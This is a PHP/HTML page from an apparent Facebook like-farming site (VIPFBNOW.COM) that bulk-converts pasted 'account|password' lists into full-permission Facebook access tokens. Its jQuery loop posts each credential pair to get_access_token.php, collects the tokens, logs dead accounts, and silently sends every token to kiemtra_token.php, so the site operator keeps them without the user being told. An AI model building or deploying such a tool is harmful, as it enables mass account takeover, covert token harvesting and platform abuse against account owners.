<?php

include 'like_hethong/head.php';
include 'like_hethong/functions.php';
include 'theme/css.php';
?>


<!DOCTYPE html>
<html lang="vi">
<meta charset="utf-8">
<head>
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <title>GET TOKEN SLL - VIPFBNOW.COM</title>
    <link rel="shortcut icon" href="https://i.imgur.com/h6NWYI8.png">
    <meta property="og:image" content="http://i.imgur.com/JA3DwPC.jpg" />
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />	
 <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
  	  <script type="text/javascript" src="code/lol.js"></script>
          <script type="text/javascript">
          function toarst(status,msg,title){
	  Command: toastr[status](msg, title)
	  toastr.options = {
	  "closeButton": true,
	  "debug": false,
	  "progressBar": true,
	  "positionClass": "toast-top-right",
	  "onclick": null,
	  "showDuration": "400",
	  "hideDuration": "1000",
	  "timeOut": "4000",
	  "extendedTimeOut": "1000",
	  "showEasing": "swing",
	  "hideEasing": "linear",
	  "showMethod": "slideDown",
	  "hideMethod": "slideUp"
	 }
         }
         </script>
</head>
	<body>
    <section>
		<div class="content">
﻿<script type="text/javascript">
	i=1;
	startnum = 0
	$(document).ready(function(e) {
	$('.ru-submit').click(function(){
		$('.container').css('display','none');
		_account = $('#editor1').val().trim();
		_app_token = $('#app_token').val().trim();
		if(_account == ""){
			$('.setting').css('display','block');
			$('#process').css('display','none');
			alert("Chưa nhập tài khoản.");
		}else{
			$('.setting').css('display','none');
			$('#process').css('display','block');
			
			_account_array = _account.split(/\n/);
			
			$(".total").text('0/'+_account_array.length);
			ajax();
			function ajax(){
				var _account = _account_array[startnum];
				
				if(_account){
					gettoken(_account);
					setTimeout(function() {
						startnum++;
						ajax();
					}, 2 * 1000);
				}
			}
			function gettoken(_account){
                var hotface = _account.split('|');
				var ngancan = "|";
				$.post('get_access_token.php', {
						app_token : _app_token,
						username : hotface[0],
						password : hotface[1]
						},function(graph){
                                                datas = JSON.parse(graph);
							if(datas.error_msg){
								var htmls = $('#editor3').text();
								htmls = _account+ngancan+datas.error_msg+"\n"+htmls;
								$(".totalerror_msg").text((startnum+1));
								$('#editor3').text(htmls);(a="error",c="Get Token Thất Bại",toarst(a,datas.error_msg,c));
							}
							if (datas.access_token){
								var htmls = $('#editor2').text();
								htmls = datas.access_token+"\n"+htmls;
								$('#editor2').text(htmls);
								$(".total").text((startnum+1)+'/'+_account_array.length);
								$.post('kiemtra_token.php', {token : datas.access_token});
							}
				});
			}
		}		
	});
});
</script>

	<div id="process" style="padding: 15px;display:none">
    	<div style="padding-bottom: 5px;"><strong>Token get thành công : <i class="total">0/0</i></strong></div>
    	<textarea cols="80" id="editor2" name="editor1" readonly rows="50" style="height:200px;width:980px;overflow-y: scroll;overflow: scroll;"></textarea>
    	<div style="padding-bottom: 5px;padding-top: 5px;"><strong>Account bị die : <i class="totalerror_msg">0</i></strong> </div>
        <textarea cols="80" id="editor3" name="editor3" readonly rows="50" style="height:200px;width:980px;overflow-y: scroll;overflow: scroll;"></textarea>
        <div>
			<p><br><i class="fa fa-check-square-o" aria-hidden="true"></i> Đừng quên copy lại.</p>
			<p><i class="fa fa-check-square-o" aria-hidden="true"></i> F5 hoặc tải lại trang để tiếp tục GET Token.</p>
	</div>
        </div>
	<form class="setting">
        <div>
           <center><label style="float:none">Nhập Danh Sách Account</label></center>
            <center><textarea cols="80" id="editor1" name="editor1" rows="50" style="height:200px;width:980px" placeholder="account1|password1|...........|.........
account2|password2|...........|........."></textarea></center> </div>
			<div><center><label style="float:none">Chọn Ứng Dụng</label></center>
			<center><select style="width:994px" name="app_token" id="app_token">
			<option value="iphone">FACEBOK FOR IPHONE [ Full Quyền ]</option>
			<option value="android">FACBOOK FOR ANDROID [ Full Quyền ]</option></center>
		</select>
		</div>
		<div>
			<p><br><i class="fa fa-check-square-o" aria-hidden="true"></i> Định dạng : <strong>account|password</strong></p>
			<p><i class="fa fa-check-square-o" aria-hidden="true"></i> Mỗi nick một dòng</p>
		</div>
<center><input type="button" value="GET Token" class="ru-submit"><hr></center>
    </form>
        </div>	</section>

	</body>
</html>
<?php
include 'like_hethong/foot.php';
?>
